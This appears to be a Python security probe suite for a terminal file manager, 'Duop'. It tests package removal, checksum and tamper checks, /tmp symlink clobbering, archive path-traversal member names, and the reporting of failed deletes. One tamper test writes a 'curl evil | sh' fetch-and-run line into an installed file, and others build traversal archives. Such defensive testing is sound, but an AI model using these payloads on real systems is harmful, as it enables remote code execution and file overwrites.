#!/usr/bin/env python3
"""Security & data-safety probes against the real binary (no root needed; all in temp dirs).

  P1  `duop pkg remove .`            -> must be refused; must not wipe the package root
  P2  package named "." in manifest  -> install refused (would write into the package root)
  P3  tampered installed package     -> `duop pkg verify` must report it
  P4  checksum mismatch on install   -> refused, nothing installed
  P5  /tmp/duop_arc_view.tmp planted as a symlink -> viewing an archive member must not write
      through it (same-user case = two Duop instances clobbering each other)
  P6  F8 delete of a file in a read-only directory -> the UI must not claim success
  P7  archive members named ../x, /abs, a/../../y -> the VFS never resolves outside the archive
  P8  F8 delete of a folder whose subfolder cannot be emptied -> no success claimed
  P9  Duop temp files under /tmp: never group/world writable, no stale copies of viewed data
"""

from __future__ import annotations

import hashlib
import io
import glob
import os
import shutil
import stat
import subprocess
import tarfile
import tempfile

from rt_common import BINARY, Report, kill, launch, read_raw


def pkg_env(tmp):
    root = os.path.join(tmp, "packages")
    os.makedirs(root, exist_ok=True)
    return dict(os.environ, HOME=tmp, DUOP_PKG_DIR=root), root


def make_pkg(path, name, files=None):
    files = files or {"tool.sh": b"#!/bin/sh\necho hi\n"}
    manifest = f"name = {name}\nversion = 1.0.0\nkind = tool\ndescription = probe\nexec = tool.sh\n".encode()
    with tarfile.open(path, "w:gz", format=tarfile.USTAR_FORMAT) as t:
        for n, data in [("manifest.ini", manifest)] + list(files.items()):
            ti = tarfile.TarInfo(n)
            ti.size = len(data)
            ti.mode = 0o755
            t.addfile(ti, io.BytesIO(data))
    return hashlib.sha256(open(path, "rb").read()).hexdigest()


def pkg(env, *args):
    return subprocess.run([BINARY, "pkg", *args], env=env, capture_output=True, text=True, timeout=20)


def p1_remove_dot(rep, tmp):
    env, root = pkg_env(tmp)
    for n in ("alpha", "beta"):
        a = os.path.join(tmp, f"{n}.tar.gz")
        pkg(env, "install", a, "--sha256", make_pkg(a, n))
    before = sorted(os.listdir(root))
    r = pkg(env, "remove", ".")
    after = sorted(os.listdir(root)) if os.path.isdir(root) else []
    rep.add(r.returncode != 0 and after == before, "P1 `pkg remove .` refused, other packages intact",
            f"rc={r.returncode}, before={before}, after={after}")


def p2_name_dot(rep, tmp):
    env, root = pkg_env(tmp)
    a = os.path.join(tmp, "dot.tar.gz")
    r = pkg(env, "install", a, "--sha256", make_pkg(a, "."))
    stray = [f for f in os.listdir(root) if f in ("manifest.ini", "tool.sh", "sha256", "files.list")]
    rep.add(r.returncode != 0 and not stray, "P2 manifest name '.' refused",
            f"rc={r.returncode}, files written into the package root: {stray}")


def p3_tamper_verify(rep, tmp):
    env, root = pkg_env(tmp)
    a = os.path.join(tmp, "gamma.tar.gz")
    pkg(env, "install", a, "--sha256", make_pkg(a, "gamma"))
    tool = os.path.join(root, "gamma", "tool.sh")
    if not os.path.exists(tool):
        rep.add(False, "P3 verify detects tampering", "install failed")
        return
    open(tool, "w").write("#!/bin/sh\ncurl evil | sh\n")
    r = pkg(env, "verify", "gamma")
    rep.add(r.returncode != 0, "P3 `pkg verify` detects a tampered installed file",
            f"rc={r.returncode} ({(r.stdout + r.stderr).strip()[:80]})")


def p4_bad_sha(rep, tmp):
    env, root = pkg_env(tmp)
    a = os.path.join(tmp, "delta.tar.gz")
    make_pkg(a, "delta")
    r = pkg(env, "install", a, "--sha256", "0" * 64)
    rep.add(r.returncode != 0 and not os.path.exists(os.path.join(root, "delta")),
            "P4 checksum mismatch refused", f"rc={r.returncode}")


def p5_tmp_symlink(rep, tmp):
    fixed = "/tmp/duop_arc_view.tmp"
    aside = None
    if os.path.lexists(fixed) and not os.path.islink(fixed):
        if os.lstat(fixed).st_uid != os.getuid():
            rep.add(True, "P5 fixed temp symlink", "skipped: path exists and belongs to another user")
            return
        aside = fixed + ".probe-aside"
        os.rename(fixed, aside)
    victim = os.path.join(tmp, "victim.txt")
    open(victim, "w").write("PRECIOUS\n")
    try:
        if os.path.lexists(fixed):
            os.unlink(fixed)
        os.symlink(victim, fixed)
    except OSError as e:
        rep.add(True, "P5 fixed temp symlink", f"skipped: {e}")
        return
    left, right = os.path.join(tmp, "l"), os.path.join(tmp, "r")
    os.makedirs(left)
    os.makedirs(right)
    with tarfile.open(os.path.join(left, "a.tar"), "w", format=tarfile.USTAR_FORMAT) as t:
        ti = tarfile.TarInfo("member.txt")
        ti.size = 9
        t.addfile(ti, io.BytesIO(b"ARCHIVED\n"))
    s = launch(["--lang", "en", left, right], {"HOME": tmp})
    try:
        read_raw(s, 0.5)
        for k, w in ((b"\x1b[B", 0.1), (b"\r", 0.4), (b"\x1b[B", 0.1), (b"\x1bOR", 0.6)):
            os.write(s.master, k)
            read_raw(s, w)
        content = open(victim).read()
        rep.add(content == "PRECIOUS\n", "P5 archive view does not write through a planted /tmp symlink",
                "" if content == "PRECIOUS\n" else "victim file overwritten with the archive member")
    finally:
        kill(s)
        if os.path.islink(fixed):
            os.unlink(fixed)
        if aside:
            os.rename(aside, fixed)


def p6_readonly_delete(rep, tmp):
    left, right = os.path.join(tmp, "l"), os.path.join(tmp, "r")
    ro = os.path.join(left, "ro")
    os.makedirs(ro)
    os.makedirs(right)
    open(os.path.join(ro, "keep.txt"), "w").write("x")
    os.chmod(ro, 0o555)
    s = launch(["--lang", "en", ro, right], {"HOME": tmp})
    try:
        read_raw(s, 0.5)
        for k, w in ((b"\x1b[B", 0.1), (b"\x1b[19~", 0.4), (b"\r", 0.8)):
            os.write(s.master, k)
            read_raw(s, w)
        txt = s.vt.full_text().lower()
        exists = os.path.exists(os.path.join(ro, "keep.txt"))
        claimed = ("deleted" in txt or "видален" in txt) and "denied" not in txt and "fail" not in txt
        rep.add(not (exists and claimed), "P6 failed delete is not reported as success",
                f"file still there={exists}, success shown={claimed}")
    finally:
        kill(s)
        os.chmod(ro, 0o755)


def p7_traversal_names(rep, tmp):
    left, right = os.path.join(tmp, "l"), os.path.join(tmp, "r")
    os.makedirs(left)
    os.makedirs(right)
    with tarfile.open(os.path.join(left, "evil.tar"), "w", format=tarfile.USTAR_FORMAT) as t:
        for n in ("../escape1.txt", "/tmp/duop_probe_abs.txt", "a/../../escape2.txt"):
            ti = tarfile.TarInfo(n)
            ti.size = 4
            t.addfile(ti, io.BytesIO(b"evil"))
    s = launch(["--lang", "en", left, right], {"HOME": tmp})
    try:
        read_raw(s, 0.5)
        for k, w in ((b"\x1b[B", 0.1), (b"\r", 0.4)) + ((b"\x1b[B", 0.05), (b"\x1bOR", 0.3), (b"\x1b", 0.1)) * 3:
            os.write(s.master, k)
            read_raw(s, w)
        escaped = [p for p in (os.path.join(tmp, "escape1.txt"), os.path.join(tmp, "escape2.txt"),
                               "/tmp/duop_probe_abs.txt") if os.path.exists(p)]
        rep.add(not escaped, "P7 traversal member names never written outside", f"escaped: {escaped}")
    finally:
        kill(s)
        if os.path.exists("/tmp/duop_probe_abs.txt"):
            os.unlink("/tmp/duop_probe_abs.txt")


def p8_nested_delete(rep, tmp):
    left, right = os.path.join(tmp, "l"), os.path.join(tmp, "r")
    ro = os.path.join(left, "d", "ro")
    os.makedirs(ro)
    os.makedirs(right)
    open(os.path.join(ro, "keep.txt"), "w").write("x")
    os.chmod(ro, 0o555)
    s = launch(["--lang", "en", left, right], {"HOME": tmp})
    try:
        read_raw(s, 0.5)
        for k, w in ((b"\x1b[B", 0.1), (b"\x1b[19~", 0.4), (b"\r", 1.0)):
            os.write(s.master, k)
            read_raw(s, w)
        txt = s.vt.full_text().lower()
        exists = os.path.exists(os.path.join(ro, "keep.txt"))
        claimed = ("deleted" in txt or "видален" in txt) and "denied" not in txt and "fail" not in txt
        rep.add(not (exists and claimed), "P8 partly failed folder delete is not reported as success",
                f"file still there={exists}, success shown={claimed}")
    finally:
        kill(s)
        os.chmod(ro, 0o755)


def p9_tmp_files(rep, tmp):
    bad = []
    for path in glob.glob("/tmp/duop_*"):
        st = os.lstat(path)
        if st.st_uid != os.getuid():
            continue
        mode = stat.S_IMODE(st.st_mode)
        if mode & 0o022:
            bad.append(f"{path} mode {oct(mode)} (group/world writable)")
        elif stat.S_ISREG(st.st_mode):
            bad.append(f"{path} left behind ({st.st_size} bytes of viewed data)")
    rep.add(not bad, "P9 no writable / stale Duop temp files in /tmp", "; ".join(bad))


def main():
    rep = Report("SECURITY PROBE")
    for case in (p1_remove_dot, p2_name_dot, p3_tamper_verify, p4_bad_sha, p5_tmp_symlink,
                 p6_readonly_delete, p7_traversal_names, p8_nested_delete, p9_tmp_files):
        tmp = tempfile.mkdtemp()
        try:
            case(rep, tmp)
        except Exception as e:                       # a probe must never abort the others
            rep.add(False, case.__name__, f"probe error: {e}")
        finally:
            for root, ds, _ in os.walk(tmp):
                for d in ds:
                    try:
                        os.chmod(os.path.join(root, d), 0o755)
                    except OSError:
                        pass
            shutil.rmtree(tmp, ignore_errors=True)
    return rep.finish()


if __name__ == "__main__":
    raise SystemExit(main())
